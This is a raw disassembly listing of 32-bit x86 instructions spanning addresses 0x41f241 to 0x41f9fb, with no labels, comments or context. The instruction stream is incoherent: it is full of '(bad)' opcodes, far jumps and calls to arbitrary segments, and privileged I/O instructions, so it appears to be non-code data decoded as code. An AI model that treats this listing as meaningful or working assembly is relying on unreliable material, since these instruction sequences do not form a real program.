  41f241:	or     eax,0xa91a1c89
  41f246:	call   0xec95:0xc3cf0f32
  41f24d:	dec    ecx
  41f24e:	dec    edx
  41f24f:	lock in eax,0xc
  41f252:	div    dh
  41f254:	repz dec edi
  41f256:	jl     0x41f250
  41f258:	test   DWORD PTR [ebp+ebp*2+0x5c549bde],esp
	...
  41f26b:	fwait
  41f26c:	loope  0x41f2db
  41f26e:	sub    eax,0xf7dbad7f
  41f273:	sar    BYTE PTR [ebx],cl
  41f275:	(bad)  
  41f276:	add    BYTE PTR [edx],ah
  41f278:	pop    esi
  41f279:	mov    edx,DWORD PTR [esi]
  41f27b:	ja     0x41f211
  41f27d:	add    DWORD PTR [eax],eax
  41f27f:	lods   al,BYTE PTR ds:[esi]
  41f280:	add    BYTE PTR [eax],al
  41f282:	add    ah,dh
  41f284:	pop    esi
  41f285:	data16 std 
  41f287:	and    dh,BYTE PTR [esi-0x20be888f]
  41f28d:	push   ds
  41f28e:	sub    BYTE PTR [edx+0x25],cl
  41f291:	pop    edx
  41f292:	fcom   DWORD PTR [esi+edi*4-0x47092574]
  41f299:	lock mov ch,0x24
  41f29c:	mov    ds:0x171d2953,al
  41f2a1:	mov    ebx,0x88df9bb6
  41f2a6:	cmp    BYTE PTR [ebp-0x331a0b70],ah
  41f2ac:	nop
  41f2ad:	cmp    al,0x4d
  41f2af:	jne    0x41f236
  41f2b1:	data16 js 0x41f241
  41f2b4:	or     DWORD PTR [ebx],esi
  41f2b6:	mov    ds,WORD PTR ds:0xf77d0532
  41f2bc:	inc    edi
  41f2bd:	dec    esi
  41f2be:	imul   dl
  41f2c0:	mov    dl,0x51
  41f2c2:	jnp    0x41f306
  41f2c4:	test   al,0xef
  41f2c6:	mov    ds:0x6e43f2f5,al
  41f2cb:	pop    esp
  41f2cc:	pop    ebx
  41f2cd:	mov    ?,WORD PTR [eax]
  41f2cf:	dec    eax
  41f2d0:	jmp    0x41f2bd
  41f2d2:	jns    0x41f28a
  41f2d4:	pusha  
  41f2d5:	loopne 0x41f273
  41f2d7:	jmp    0x41f2c6
  41f2d9:	sub    DWORD PTR [edi],esi
  41f2db:	fnstsw WORD PTR [ecx]
  41f2dd:	add    BYTE PTR [bp+di-0x15],dl
  41f2e1:	in     eax,dx
  41f2e2:	adc    dh,ah
  41f2e4:	jns    0x41f32a
  41f2e6:	fldcw  WORD PTR [ebx-0x29]
  41f2e9:	mov    edx,0xa26cd3f8
  41f2ee:	mov    cl,0x29
  41f2f0:	jmp    0xd48057b7
  41f2f5:	pushf  
  41f2f6:	loopne 0x41f326
  41f2f8:	mov    cl,0x11
  41f2fa:	jb     0x41f29b
  41f2fc:	outs   dx,BYTE PTR ds:[esi]
  41f2fd:	dec    edi
  41f2fe:	pop    es
  41f2ff:	rcr    ebp,1
  41f301:	sub    al,0xab
  41f303:	mov    ds:0x6e538e1d,eax
  41f308:	inc    esp
  41f309:	cmp    eax,0xe633e129
  41f30e:	(bad)  
  41f30f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f310:	fwait
  41f311:	push   0xcff430d5
  41f316:	or     dh,ch
  41f318:	or     esp,edi
  41f31a:	aad    0x4d
  41f31c:	sbb    eax,DWORD PTR [ebp+0x1e1f1a7c]
  41f322:	les    ebx,FWORD PTR [ebp+0x3faf298a]
  41f328:	mov    ch,dh
  41f32a:	push   ebp
  41f32b:	pop    es
  41f32c:	cmc    
  41f32d:	pop    esp
  41f32e:	pop    esp
	...
  41f33b:	or     bh,dh
  41f33d:	ja     0x41f389
  41f33f:	dec    edx
  41f341:	cmp    eax,0x2e8eedf7
  41f346:	dec    eax
  41f347:	rol    BYTE PTR [ecx],1
  41f349:	push   cs
  41f34a:	stos   DWORD PTR es:[edi],eax
  41f34b:	and    edx,DWORD PTR [ebp+0xac0001]
  41f351:	add    BYTE PTR [eax],al
  41f353:	push   ss
  41f354:	nop
  41f355:	(bad)  
  41f356:	push   ecx
  41f357:	leave  
  41f358:	inc    edx
  41f359:	stos   DWORD PTR es:[edi],eax
  41f35a:	mov    bl,0x9d
  41f35c:	dec    edx
  41f35d:	adc    DWORD PTR [ebx],eax
  41f35f:	add    esi,DWORD PTR [ecx+ebp*4]
  41f362:	pop    edx
  41f363:	bound  esi,QWORD PTR [esi]
  41f365:	ror    BYTE PTR [edi+0x36153b47],1
  41f36b:	cmp    ah,BYTE PTR [ecx]
  41f36d:	jmp    0x1226:0x5c924651
  41f374:	fmulp  st(4),st
  41f376:	and    eax,0x734ecde
  41f37b:	pop    ebp
  41f37c:	and    al,0x7f
  41f37e:	es mov ch,0x36
  41f381:	push   ebx
  41f382:	fcmove st,st(4)
  41f384:	pop    esp
  41f385:	adc    ebp,DWORD PTR [esi-0x79]
  41f388:	mov    ecx,0xd4ed6b38
  41f38d:	sub    al,0xb
  41f38f:	push   ds
  41f390:	in     eax,0xc8
  41f392:	mov    bh,0x55
  41f394:	push   edx
  41f395:	adc    eax,ebp
  41f397:	sub    DWORD PTR [edi+0x56],0x87d05569
  41f39e:	aas    
  41f39f:	les    ebx,FWORD PTR [ebx-0x58046319]
  41f3a5:	les    ebp,FWORD PTR cs:0x2f471e98
  41f3ac:	pop    edx
  41f3ad:	mov    ebp,0x56e2c883
  41f3b2:	cmp    BYTE PTR [eax],al
  41f3b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b5:	stc    
  41f3b6:	arpl   WORD PTR [eax-0x2d],di
  41f3b9:	pop    ebp
  41f3ba:	adc    al,0x8
  41f3bc:	jge    0x41f39f
  41f3be:	std    
  41f3bf:	mov    gs,WORD PTR ds:0xb84ce78
  41f3c5:	retf   0x7ffd
  41f3c8:	mov    BYTE PTR [esi-0x3e5844bf],al
  41f3ce:	daa    
  41f3cf:	mov    edi,0x5d188b0d
  41f3d4:	jae    0x41f3dd
  41f3d6:	fidivr WORD PTR [eax+0x1641b9f7]
  41f3dc:	retf   0xbf4c
  41f3df:	aaa    
  41f3e0:	test   bl,bl
  41f3e2:	or     eax,0x1d5b99c4
  41f3e7:	inc    esp
  41f3e8:	pop    esp
  41f3e9:	and    edi,DWORD PTR [ebx+0x50]
  41f3ec:	add    al,0x98
  41f3ee:	xchg   BYTE PTR [ebx-0x68],dl
  41f3f1:	push   ebp
  41f3f2:	mov    cl,0x87
  41f3f4:	dec    esi
  41f3f5:	sar    BYTE PTR [ecx],1
  41f3f7:	sub    ebp,DWORD PTR [ecx-0x608bca17]
  41f3fd:	into   
  41f3fe:	xchg   ebp,eax
	...
  41f40b:	arpl   WORD PTR ss:[eax-0x10],bp
  41f40f:	jge    0x41f40c
  41f411:	mov    esi,0x8c7853e7
  41f416:	daa    
  41f417:	jge    0x41f462
  41f419:	jmp    0x1d7c393
  41f41e:	add    BYTE PTR [eax+eax*1+0x782e0000],ch
  41f425:	xor    esp,ebx
  41f427:	fstp   TBYTE PTR [esp+edx*4-0x17e4e419]
  41f42e:	dec    eax
  41f42f:	clc    
  41f430:	shl    BYTE PTR [ebx+0x5c],0x68
  41f434:	iret   
  41f435:	fcmovnu st,st(0)
  41f437:	dec    ebp
  41f438:	mov    esp,0xf61018ad
  41f43d:	clc    
  41f43e:	adc    esi,DWORD PTR [edi-0xf]
  41f441:	push   esp
  41f442:	and    eax,0xd8c555bd
  41f447:	jmp    0x628e:0x97a2da25
  41f44e:	sub    ebp,DWORD PTR [esi+0x3671fbc1]
  41f454:	iret   
  41f455:	hlt    
  41f456:	adc    edi,DWORD PTR [esi-0x3a]
  41f459:	pop    esp
  41f45a:	(bad)  
  41f45b:	loopne 0x41f3fe
  41f45d:	rcl    BYTE PTR [edi-0x36f5fdb6],1
  41f463:	sbb    esi,edi
  41f465:	clc    
  41f466:	push   es
  41f467:	pop    edi
  41f468:	xor    al,0x7c
  41f46a:	and    ecx,edx
  41f46c:	cmp    ecx,DWORD PTR [ecx+0x7b]
  41f46f:	rcr    DWORD PTR [ecx+0x87196c0],cl
  41f475:	pop    ecx
  41f476:	mov    ds:0xd85acb11,al
  41f47b:	in     al,dx
  41f47c:	or     BYTE PTR [edx],cl
  41f47e:	cdq    
  41f47f:	in     eax,0x1b
  41f481:	sbb    DWORD PTR [ebp-0x7b3557ed],0x7
  41f488:	add    DWORD PTR [edx+0x26f6dd2f],esi
  41f48e:	and    eax,0x262e4bc4
  41f493:	xor    DWORD PTR [ecx+0x71d39192],ebx
  41f499:	fidiv  DWORD PTR [esi+0x77550387]
  41f49f:	ret    0x591
  41f4a2:	clc    
  41f4a3:	jbe    0x41f42b
  41f4a5:	rcl    BYTE PTR [edi+0x26],1
  41f4a8:	inc    ecx
  41f4a9:	sbb    BYTE PTR [edx-0x7f],ah
  41f4ac:	test   eax,0x4ba31180
  41f4b1:	(bad)  
  41f4b2:	ds into 
  41f4b4:	sbb    bl,BYTE PTR [edi]
  41f4b6:	mov    al,ds:0xfc3e9ec3
  41f4bb:	cld    
  41f4bc:	aaa    
  41f4bd:	es sahf 
  41f4bf:	inc    edi
  41f4c0:	jns    0x41f48f
  41f4c2:	cdq    
  41f4c3:	cmp    DWORD PTR [ecx-0x11],ebp
  41f4c6:	enter  0x913a,0x4e
  41f4ca:	(bad)  
  41f4cb:	push   edi
  41f4cc:	pop    es
  41f4cd:	adc    DWORD PTR [eax+0x0],eax
	...
  41f4d8:	add    BYTE PTR [eax],al
  41f4da:	add    BYTE PTR [edi],ah
  41f4dc:	push   ecx
  41f4dd:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  41f4e7:	push   0x93e00cfb
  41f4ec:	mov    ds:0xac0001,al
  41f4f1:	add    BYTE PTR [eax],al
  41f4f3:	mov    esi,0xd9509e91
  41f4f8:	daa    
  41f4f9:	push   cs
  41f4fa:	popa   
  41f4fb:	dec    ebp
  41f4fc:	mov    BYTE PTR [edx-0x5e],bl
  41f4ff:	jbe    0x83870d62
  41f505:	clc    
  41f506:	leave  
  41f507:	cld    
  41f508:	into   
  41f509:	das    
  41f50a:	aas    
  41f50b:	jmp    0x396e:0x2afeb4e2
  41f512:	ss nop
  41f514:	retf   0xdedf
  41f517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f518:	cmp    BYTE PTR [eax+0x2ddbf9c8],ah
  41f51e:	pushf  
  41f51f:	sbb    al,0xa9
  41f521:	sub    eax,0x1ef984c4
  41f526:	mov    dl,0xb6
  41f528:	inc    esi
  41f529:	enter  0x5ac9,0x3a
  41f52d:	nop
  41f52e:	aad    0xf6
  41f530:	adc    al,0x2e
  41f532:	loop   0x41f553
  41f534:	jno    0x41f545
  41f536:	pop    ebx
  41f537:	pop    ebx
  41f538:	cld    
  41f539:	mov    esp,0x958cb2cc
  41f53e:	xchg   edi,eax
  41f53f:	xchg   ecx,eax
  41f540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f541:	daa    
  41f542:	lea    esp,[esi+ecx*4+0x1aa9d3f3]
  41f549:	lahf   
  41f54a:	pop    es
  41f54b:	into   
  41f54c:	jnp    0x41f57f
  41f54e:	adc    al,0x9f
  41f550:	in     eax,0xf4
  41f552:	pusha  
  41f553:	add    BYTE PTR [eax-0x3d],ah
  41f556:	sbb    eax,0x1356cb30
  41f55b:	push   ebx
  41f55c:	outs   dx,BYTE PTR ds:[esi]
  41f55d:	test   BYTE PTR [ecx+edx*2+0x23],cl
  41f561:	fdiv   QWORD PTR [ebp+0x2847a3dd]
  41f567:	add    BYTE PTR [esi],cl
  41f569:	or     al,0xd3
  41f56b:	jmp    0xb01f1f4b
  41f570:	adc    BYTE PTR [ebp-0x46ad652c],dl
  41f576:	and    al,0x7e
  41f578:	inc    edi
  41f579:	xchg   ebx,eax
  41f57a:	aaa    
  41f57b:	push   ss
  41f57c:	cld    
  41f57d:	mov    bh,0x43
  41f57f:	call   0x182f:0x666f1c3e
  41f586:	loop   0x41f607
  41f588:	inc    ebx
  41f589:	fwait
  41f58a:	jb     0x41f51f
  41f58c:	jge    0x41f591
  41f58e:	aam    0xfe
  41f590:	push   cs
  41f591:	mov    esi,ebp
  41f593:	mov    bh,0xc3
  41f595:	jae    0x41f5e4
  41f597:	retf   0xc635
  41f59a:	ins    DWORD PTR es:[edi],dx
  41f59b:	call   FWORD PTR [edx]
  41f59d:	cmp    al,BYTE PTR [ebx+0x0]
	...
  41f5ab:	daa    
  41f5ac:	ss lahf 
  41f5ae:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f5b4:	and    eax,0x8837075b
  41f5b9:	dec    ecx
  41f5ba:	dec    ecx
  41f5bb:	aas    
  41f5bc:	mov    ds:0xac0001,eax
  41f5c1:	add    BYTE PTR [eax],al
  41f5c3:	fisub  WORD PTR [edx+ebx*8+0x224992e4]
  41f5ca:	or     al,0x3b
  41f5cc:	nop
  41f5cd:	jle    0x41f56b
  41f5cf:	jne    0x41f5a9
  41f5d1:	pop    eax
  41f5d2:	fcomi  st,st(6)
  41f5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5d5:	jl     0x41f631
  41f5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5d8:	sub    ecx,ecx
  41f5da:	lds    ebp,FWORD PTR [edi-0x5]
  41f5dd:	ins    BYTE PTR es:[edi],dx
  41f5de:	push   ebx
  41f5df:	mov    ecx,0xafe85287
  41f5e4:	and    edx,eax
  41f5e6:	xchg   esi,eax
  41f5e7:	retf   0xc683
  41f5ea:	mov    ebp,0x5dc91fb9
  41f5ef:	cmp    DWORD PTR [ebx+0x17],0xa1789a0
  41f5f6:	push   eax
  41f5f7:	mov    edi,0x7b302589
  41f5fc:	fld    DWORD PTR [ebp-0x160c7174]
  41f602:	add    al,0x1d
  41f604:	stos   BYTE PTR es:[edi],al
  41f605:	sub    esi,DWORD PTR [ecx]
  41f607:	fimul  WORD PTR [ebx+0x20c7bf14]
  41f60d:	add    al,0xfa
  41f60f:	pop    eax
  41f610:	test   eax,0xd7f736f7
  41f615:	loopne 0x41f648
  41f617:	pop    ebp
  41f618:	pop    edx
  41f619:	rol    ebp,0x39
  41f61c:	call   0xa13f:0x139bfb78
  41f623:	add    al,0x81
  41f625:	jge    0x41f62d
  41f627:	mov    ebx,0xc8e40671
  41f62c:	in     al,dx
  41f62d:	ror    al,0xce
  41f630:	std    
  41f631:	mov    dl,0x3a
  41f633:	imul   ebx,DWORD PTR [ebx-0x5c],0xe914ef13
  41f63a:	or     eax,0x40bc58c0
  41f63f:	imul   ebx,esp,0xa6039533
  41f645:	sub    al,0x81
  41f647:	mov    eax,ds:0xbd934dc7
  41f64c:	lds    edx,FWORD PTR [edi-0x51]
  41f64f:	adc    BYTE PTR [ecx],0x86
  41f652:	xor    al,0x69
  41f654:	in     al,0x58
  41f656:	gs jae 0x41f628
  41f659:	inc    edx
  41f65a:	jg     0x41f636
  41f65c:	jnp    0x41f648
  41f65e:	fs shr ecx,cl
  41f661:	loopne 0x41f5f4
  41f663:	add    al,0xf2
  41f665:	push   ebp
  41f666:	test   ch,cl
  41f668:	pop    esp
  41f669:	mov    esp,0xb593147b
  41f66e:	pop    DWORD PTR [eax]
	...
  41f678:	add    BYTE PTR [eax],al
  41f67a:	add    BYTE PTR [edi],dh
  41f67c:	(bad)  
  41f67d:	out    0xc2,eax
  41f67f:	mul    ebx
  41f681:	aaa    
  41f682:	cmc    
  41f683:	xchg   ecx,eax
  41f684:	call   0xc280:0x8750eef4
  41f68b:	jmp    0x41f630
  41f68d:	add    DWORD PTR [eax],eax
  41f68f:	lods   al,BYTE PTR ds:[esi]
  41f690:	add    BYTE PTR [eax],al
  41f692:	add    BYTE PTR [ecx],bh
  41f694:	jnp    0x41f6e3
  41f696:	icebp  
  41f697:	xor    ebp,DWORD PTR [ecx]
  41f699:	fsub   DWORD PTR ds:0x757cfc49
  41f69f:	shr    DWORD PTR [edx-0x52],cl
  41f6a2:	mov    ebp,0x36e5139a
  41f6a7:	retf   0xf4ce
  41f6aa:	inc    ebx
  41f6ab:	mov    al,0x43
  41f6ad:	rcr    BYTE PTR [ebx+esi*2-0x4cf672e2],1
  41f6b4:	mov    DWORD PTR [ebx+ebx*4-0x32cbfe94],0xd006779
  41f6bf:	xchg   esp,eax
  41f6c0:	push   eax
  41f6c1:	ss push eax
  41f6c3:	mov    al,0x2e
  41f6c5:	push   0xffffffe9
  41f6c7:	cs aaa 
  41f6c9:	out    dx,eax
  41f6ca:	icebp  
  41f6cb:	enter  0x4e90,0xf5
  41f6cf:	cmp    al,0x89
  41f6d1:	jp     0x41f670
  41f6d3:	xchg   ecx,eax
  41f6d4:	push   ds
  41f6d5:	pop    ebp
  41f6d6:	nop
  41f6d7:	idiv   DWORD PTR [edx+ebx*2]
  41f6da:	popa   
  41f6db:	add    al,dh
  41f6dd:	fidivr DWORD PTR [edi-0x6b]
  41f6e0:	aam    0x5a
  41f6e2:	sbb    BYTE PTR [esi+0x2145e1a7],ah
  41f6e8:	(bad)  [edi-0x79]
  41f6eb:	(bad)  
  41f6ed:	test   esi,ebx
  41f6ef:	stos   DWORD PTR es:[edi],eax
  41f6f0:	ror    BYTE PTR [ecx-0x56950a82],0x3e
  41f6f7:	outs   dx,BYTE PTR ds:[esi]
  41f6f8:	xchg   edx,eax
  41f6f9:	add    bl,BYTE PTR [edx]
  41f6fb:	adc    eax,0xb7b0e56f
  41f700:	lahf   
  41f701:	xor    ebx,DWORD PTR [ecx]
  41f703:	addr16 (bad) 
  41f705:	pop    esi
  41f706:	pop    esp
  41f707:	sub    al,0x3e
  41f709:	scas   eax,DWORD PTR es:[edi]
  41f70a:	retf   0x377f
  41f70d:	xor    eax,DWORD PTR [esi]
  41f70f:	outs   dx,DWORD PTR ds:[esi]
  41f710:	inc    ecx
  41f711:	daa    
  41f712:	and    BYTE PTR [esi],cl
  41f714:	leave  
  41f715:	outs   dx,DWORD PTR ds:[esi]
  41f716:	sbb    al,0x6e
  41f718:	pusha  
  41f719:	pop    ebx
  41f71a:	out    0xda,al
  41f71c:	(bad)  
  41f71d:	inc    ebp
  41f71e:	xlat   BYTE PTR ds:[ebx]
  41f71f:	push   cs
  41f720:	mov    ebp,0x296c0edf
  41f725:	fimul  DWORD PTR [eax]
  41f727:	les    esi,FWORD PTR [edi-0x78]
  41f72a:	xor    edi,DWORD PTR [ecx+edx*4]
  41f72d:	pop    ds
  41f72e:	mov    ds:0x42d81186,eax
  41f733:	cmc    
  41f734:	ds mov esi,0xdee913dd
  41f73a:	int    0xed
  41f73c:	or     ah,BYTE PTR [edx+eax*4+0x0]
	...
  41f748:	add    BYTE PTR [eax],al
  41f74a:	add    BYTE PTR [esi],dl
  41f74c:	aad    0xdf
  41f74e:	out    dx,eax
  41f74f:	fucomip st,st(7)
  41f751:	ss std 
  41f753:	cmp    BYTE PTR [esi+0x25b15f3a],al
  41f759:	and    al,0x2f
  41f75b:	xchg   edi,eax
  41f75c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f75d:	add    DWORD PTR [eax],eax
  41f75f:	lods   al,BYTE PTR ds:[esi]
  41f760:	add    BYTE PTR [eax],al
  41f762:	add    BYTE PTR [edx+eax*2],bl
  41f765:	outs   dx,BYTE PTR ds:[esi]
  41f766:	hlt    
  41f767:	jo     0x41f733
  41f769:	sub    BYTE PTR [edi+ecx*4+0x1e],al
  41f76d:	dec    esi
  41f76e:	push   edx
  41f76f:	out    dx,al
  41f770:	xor    eax,0xc261631c
  41f775:	jb     0x41f7c4
  41f777:	in     al,dx
  41f778:	xor    BYTE PTR [eax],ah
  41f77a:	push   edi
  41f77b:	lds    edx,FWORD PTR [eax-0x64]
  41f77e:	mov    cl,0xe2
  41f780:	mov    esi,0xb61b1ad
  41f785:	push   0xd
  41f787:	es mov cl,0x67
  41f78a:	cli    
  41f78b:	(bad)  
  41f78d:	sar    edx,1
  41f78f:	leave  
  41f790:	stos   DWORD PTR es:[edi],eax
  41f791:	imul   ebx,DWORD PTR [ecx+0x5bd19277],0xf4f2387f
  41f79b:	in     eax,dx
  41f79c:	sub    al,0x11
  41f79e:	adc    BYTE PTR [eax],0xf3
  41f7a1:	in     al,0x1c
  41f7a3:	jle    0x41f7eb
  41f7a5:	or     eax,0xefe59e5d
  41f7aa:	jbe    0x41f7ef
  41f7ac:	addr16 jmp 0xb460:0x6801cd2d
  41f7b4:	mov    al,0xe1
  41f7b6:	or     edx,DWORD PTR [ebx]
  41f7b8:	mov    eax,ds:0xeed48a69
  41f7bd:	ds jp  0x41f7a3
  41f7c0:	outs   dx,BYTE PTR ds:[esi]
  41f7c1:	test   BYTE PTR [eax],dl
  41f7c3:	jo     0x41f801
  41f7c5:	nop
  41f7c6:	sub    al,0x4e
  41f7c8:	xchg   DWORD PTR [edi-0x6a73f5c7],esp
  41f7ce:	lods   al,BYTE PTR ds:[esi]
  41f7cf:	mov    fs,WORD PTR [edi+0x19]
  41f7d2:	and    al,0xd0
  41f7d4:	pop    ss
  41f7d5:	(bad)  
  41f7d7:	ret    
  41f7d8:	pop    ebp
  41f7d9:	stos   BYTE PTR es:[edi],al
  41f7da:	cmp    DWORD PTR [esi+0x66adf60f],0xd8113738
  41f7e4:	push   esp
  41f7e5:	pcmpeqb mm3,QWORD PTR [eax-0x52]
  41f7e9:	xor    edx,0xd8eeb891
  41f7ef:	sub    DWORD PTR [esi+esi*4],eax
  41f7f2:	xchg   esp,eax
  41f7f3:	addr16 ret 0x4308
  41f7f7:	retf   0x9eab
  41f7fa:	fmul   DWORD PTR [edi]
  41f7fc:	inc    ebp
  41f7fd:	in     al,dx
  41f7fe:	out    0xb7,eax
  41f800:	sbb    ebx,eax
  41f802:	push   edx
  41f803:	out    dx,eax
  41f804:	mov    esp,0xc333b56b
  41f809:	xchg   ebx,eax
  41f80a:	gs popf 
  41f80c:	(bad)  
  41f80d:	fdiv   DWORD PTR [eax+eax*1+0x0]
	...
  41f819:	add    BYTE PTR [eax],al
  41f81b:	outs   dx,BYTE PTR ds:[esi]
  41f81c:	jbe    0x41f802
  41f81e:	retf   0xdafc
  41f821:	outs   dx,BYTE PTR ds:[esi]
  41f822:	neg    BYTE PTR [eax]
  41f824:	xchg   edx,eax
  41f825:	xchg   DWORD PTR [edi-0x1a3ec638],edx
  41f82b:	inc    ebx
  41f82c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f82d:	add    DWORD PTR [eax],eax
  41f82f:	lods   al,BYTE PTR ds:[esi]
  41f830:	add    BYTE PTR [eax],al
  41f832:	add    BYTE PTR [ebp+edx*4-0x383ff0b5],ah
  41f839:	adc    esi,edi
  41f83b:	rcl    DWORD PTR [ebx-0x4009eb54],cl
  41f841:	push   cs
  41f842:	std    
  41f843:	cld    
  41f844:	sbb    DWORD PTR [ebx+0x3b],esi
  41f847:	pop    ds
  41f848:	ret    0x6545
  41f84b:	and    dl,BYTE PTR [edx]
  41f84d:	mov    esi,0xeb7951ee
  41f852:	inc    esp
  41f853:	repnz pushf 
  41f855:	leave  
  41f856:	jno    0x41f8b0
  41f858:	jg     0x41f89b
  41f85a:	pop    edi
  41f85b:	mov    ch,0xd7
  41f85d:	clc    
  41f85e:	ror    BYTE PTR [edi-0x3a],1
  41f861:	and    DWORD PTR [ebx+0x3becbee6],esi
  41f867:	push   esp
  41f868:	aaa    
  41f869:	sub    eax,0x846b8d68
  41f86e:	dec    ebp
  41f86f:	imul   ebp,DWORD PTR [edi],0x3b
  41f872:	inc    eax
  41f873:	cwde   
  41f874:	lahf   
  41f875:	add    eax,0x10fc3ec3
  41f87a:	pop    ss
  41f87b:	mov    ah,0x66
  41f87d:	sub    dh,BYTE PTR [edi-0x4a]
  41f880:	adc    al,BYTE PTR [edx-0x7]
  41f883:	jno    0x41f828
  41f885:	push   es
  41f886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f887:	icebp  
  41f888:	jns    0x41f82d
  41f88a:	out    0xf6,al
  41f88c:	push   ecx
  41f88d:	in     eax,dx
  41f88e:	xor    eax,0x52534210
  41f893:	inc    esi
  41f894:	jg     0x41f892
  41f896:	sahf   
  41f897:	push   es
  41f898:	pop    edx
  41f899:	aam    0xfa
  41f89b:	imul   eax,DWORD PTR [edx+eiz*1-0x364e47ed],0x2c
  41f8a3:	stc    
  41f8a4:	push   es
  41f8a5:	out    0x2b,eax
  41f8a7:	aas    
  41f8a8:	inc    ebx
  41f8a9:	pop    ss
  41f8aa:	inc    eax
  41f8ab:	add    BYTE PTR [edi+0x6f],0xfc
  41f8af:	loop   0x41f897
  41f8b1:	out    0xc4,al
  41f8b3:	(bad)  
  41f8b4:	ins    BYTE PTR es:[edi],dx
  41f8b5:	lea    esi,[eax-0xf9a889c]
  41f8bb:	ins    BYTE PTR es:[edi],dx
  41f8bc:	retf   0x1116
  41f8bf:	pop    ss
  41f8c0:	sahf   
  41f8c1:	push   ecx
  41f8c2:	mov    dl,0x52
  41f8c4:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8c6:	jne    0x41f89c
  41f8c8:	jle    0x41f918
  41f8ca:	and    eax,0x7db2bc7c
  41f8cf:	jge    0x41f877
  41f8d1:	adc    eax,0x7af1acec
  41f8d6:	and    DWORD PTR [ebp-0x18],ebp
  41f8d9:	or     DWORD PTR [eax],ebp
  41f8db:	xchg   edi,eax
  41f8dc:	call   0x42a04b
	...
  41f8e9:	add    BYTE PTR [eax],al
  41f8eb:	cmp    dl,BYTE PTR [edx-0x3c]
  41f8ee:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  41f8f5:	nop
  41f8f6:	ror    DWORD PTR [eax+0x67],cl
  41f8f9:	sbb    DWORD PTR [esi],edx
  41f8fb:	out    dx,eax
  41f8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8fd:	add    DWORD PTR [eax],eax
  41f8ff:	lods   al,BYTE PTR ds:[esi]
  41f900:	add    BYTE PTR [eax],al
  41f902:	add    BYTE PTR [esi+0x29],bh
  41f905:	sbb    ebx,ebp
  41f907:	lea    esi,[eax-0x15]
  41f90a:	fst    DWORD PTR [ebx]
  41f90c:	adc    BYTE PTR [esi+0x32],0xb3
  41f910:	fcom   QWORD PTR [eax]
  41f912:	bound  ebp,QWORD PTR [eax+0x7d]
  41f915:	push   ebp
  41f916:	imul   BYTE PTR [ebx]
  41f918:	or     BYTE PTR [edx+esi*8+0x59e67487],bh
  41f91f:	xchg   DWORD PTR [ebx],eax
  41f921:	jns    0x41f8df
  41f923:	xlat   BYTE PTR es:[bx]
  41f926:	fstp   DWORD PTR [edx-0x74]
  41f929:	inc    edx
  41f92a:	sahf   
  41f92b:	shl    edi,1
  41f92d:	xchg   edx,eax
  41f92e:	pop    edx
  41f92f:	sub    DWORD PTR [edi-0x56],edx
  41f932:	xor    al,0xbf
  41f934:	enter  0xe5ba,0x20
  41f938:	out    0x5,al
  41f93a:	xor    eax,0xe95d1538
  41f93f:	add    al,0x78
  41f941:	ret    0x8655
  41f944:	iret   
  41f945:	sbb    ch,al
  41f947:	add    al,0x95
  41f949:	je     0x41f9a4
  41f94b:	xor    eax,0x8c4daf0e
  41f950:	pop    ebp
  41f951:	inc    esi
  41f952:	jle    0x41f8e6
  41f954:	push   ecx
  41f955:	cli    
  41f956:	lock sub ah,BYTE PTR [edx-0x442eb3e0]
  41f95d:	mov    ah,0x1b
  41f95f:	loopne 0x41f90c
  41f961:	clc    
  41f962:	sbb    DWORD PTR ds:0xa6c32da5,eax
  41f968:	add    ch,bl
  41f96a:	adc    eax,0xa48f46d2
  41f96f:	stos   BYTE PTR es:[edi],al
  41f970:	mov    ecx,0xb5990ce5
  41f975:	and    ah,cl
  41f977:	aad    0x8e
  41f979:	cli    
  41f97a:	ret    
  41f97b:	mov    ah,0x71
  41f97d:	adc    al,0x7
  41f97f:	fstp   TBYTE PTR [edi-0x7fbce7ce]
  41f985:	shl    esp,1
  41f987:	mov    gs,WORD PTR [edi+edi*4-0x49]
  41f98b:	iret   
  41f98c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f98d:	popa   
  41f98e:	mov    ebp,0x15538023
  41f993:	dec    esi
  41f994:	sar    DWORD PTR [esi+0x71],cl
  41f997:	xor    DWORD PTR [edi-0x9],ecx
  41f99a:	mov    bh,0xa1
  41f99c:	int3   
  41f99d:	adc    al,0xfa
  41f99f:	jg     0x41f961
  41f9a1:	repnz aad 0x66
  41f9a4:	in     eax,0x98
  41f9a6:	adc    eax,0x325e14e6
  41f9ab:	jbe    0x41f9eb
  41f9ad:	push   eax
  41f9ae:	sub    eax,DWORD PTR [eax]
	...
  41f9b8:	add    BYTE PTR [eax],al
  41f9ba:	add    BYTE PTR [ebx-0x4293427d],dl
  41f9c0:	jle    0x41f995
  41f9c2:	call   DWORD PTR [eax-0x20]
  41f9c5:	cli    
  41f9c6:	call   0xa69b:0xf0eb9331
  41f9cd:	add    DWORD PTR [eax],eax
  41f9cf:	lods   al,BYTE PTR ds:[esi]
  41f9d0:	add    BYTE PTR [eax],al
  41f9d2:	add    dl,ah
  41f9d4:	adc    bl,BYTE PTR [ebx]
  41f9d6:	fiadd  WORD PTR [esi]
  41f9d8:	mov    bl,0xe6
  41f9da:	push   es
  41f9db:	sub    al,0xc
  41f9dd:	sbb    BYTE PTR [edx-0x29c22ec7],dl
  41f9e3:	push   ebp
  41f9e4:	xchg   esp,eax
  41f9e5:	fwait
  41f9e6:	inc    BYTE PTR [eax+0x4a]
  41f9e9:	fcomp  QWORD PTR [ebp-0x44d88127]
  41f9ef:	push   edx
  41f9f0:	add    BYTE PTR [edi-0x3297a9b],ah
  41f9f6:	or     eax,DWORD PTR [edi+esi*8+0x6d]
  41f9fa:	inc    edx
  41f9fb:	xor    esp,DWORD PTR [esi+0x5a]
